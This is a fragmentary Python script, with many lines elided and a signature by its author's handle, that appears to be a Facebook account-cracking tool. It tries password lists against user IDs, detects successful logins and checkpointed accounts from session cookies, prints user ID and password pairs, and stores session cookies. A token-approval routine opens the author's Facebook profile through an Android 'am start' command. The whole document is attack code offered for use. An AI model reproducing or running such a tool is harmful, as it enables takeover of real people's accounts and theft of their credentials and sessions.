...
#tottaly written by ANONYMOUS U7P4L 
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mANONYMOUS U7P4L -OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    cid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mANONYMOUS U7P4L -CP\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ANONYMOUS U7P4L ] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%ANONYMOUS U7P4L %20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/mr.umoxr?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
